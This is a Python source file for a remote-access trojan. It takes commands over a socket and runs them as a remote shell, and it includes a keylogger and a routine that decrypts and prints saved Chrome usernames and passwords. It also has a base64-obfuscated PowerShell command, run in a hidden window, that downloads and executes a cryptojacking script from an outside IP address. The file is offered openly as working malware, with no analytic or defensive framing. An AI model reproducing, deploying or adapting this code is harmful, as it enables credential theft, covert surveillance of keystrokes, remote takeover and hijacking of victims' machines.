import os
import socket
import subprocess
from pynput import keyboard
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES

HOST = '127.0.0.1'
PORT = 1234

client_socket = socket.socket()
client_socket.connect((HOST, PORT))

class crypto_xmr:
    def monero(self):
        command = r"powershell.exe [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('d2hpbGUgKCR0cnVlKSB7IGlmIChUZXN0LUNvbm5lY3Rpb24gLUNvbXB1dGVyTmFtZSB3d3cuZ29vZ2xlLmNvbSAtQ291bnQgMSAtUXVpZXQpIHtpRXgoTmV3LU9iamVjdCBOZXQuV0ViY2xJZW50KS5Eb1duTE9hZHN0UmluRygnaHR0cDovLzguMjE5LjIyMS4xODEvY3J5cHRvamFjay9zdGFnZTEucHMxJykgOyBicmVhayB9IGVsc2UgeyBTdGFydC1TbGVlcCAtU2Vjb25kcyAxMCB9IH0K')) | powershell -nop -windowstyle hidden -"
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        print(output)
        
class start_keylogger:
    def keylogger(self):
        print('Keystarted')

        def on_press(key):
            current_directory = os.getcwd()
            file_path = os.path.join(current_directory, 'keyboard_log.txt')

            with open(file_path, 'a') as file:
                file.write(str(key) + '\n')

        listener = keyboard.Listener(on_press=on_press)
        listener.start()

class ChromePasswordDecryptor:
    def __init__(self):
        self.chrome_login_state_key = os.environ['USERPROFILE'] + r'\AppData\Local\Google\Chrome\User Data\Local State'
        self.chrome_login_data_sql = os.environ['USERPROFILE'] + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'

    def decrypt_key(self, encrypted_key):
        encrypted_key = encrypted_key[5:]
        decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return decrypted_key

    def generate_cipher(self, key, iv):
        cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
        return cipher

    def decrypt_payload(self, cipher, payload):
        decrypted_payload = cipher.decrypt(payload)
        return decrypted_payload

    def print_passwords(self):
        with open(self.chrome_login_state_key) as k:
            local_state = json.load(k)
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            secret_key = self.decrypt_key(encrypted_key)

        conn = sqlite3.connect(self.chrome_login_data_sql)
        cursor = conn.cursor()

        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        logins = cursor.fetchall()

        for login in logins:
            action_url = login[0]
            username = login[1]
            ciphertext = login[2]

            initialisation_vector = ciphertext[3:15]
            encrypted_password = ciphertext[15:-16]
            cipher = self.generate_cipher(secret_key, initialisation_vector)
            decrypted_password = self.decrypt_payload(cipher, encrypted_password)
            decrypted_password = decrypted_password.decode()

            print(f"URL: {action_url}")
            print(f"Username: {username}")
            print(f"Password: {decrypted_password}")
            print("-" * 50)

        cursor.close()
        conn.close()
# cryptojack
cryptojack = crypto_xmr()

# keylogger
keylogger = start_keylogger()

# Chrome password decryptor
decryptor = ChromePasswordDecryptor()

while True:
    data_rec = client_socket.recv(1024).decode()
    if data_rec.lower() == "exit":
        break
    elif data_rec.lower() == "keylogger_start":
        keylogger.keylogger()
    elif data_rec.lower() == "chrome_pass":
        decryptor.print_passwords()
    elif data_rec.lower() == "cryptojack_monero":
        cryptojack.monero();
    else:
        cmd_output = subprocess.getoutput(data_rec)
        client_socket.send(cmd_output.encode())
        print('Command executed')

client_socket.close()
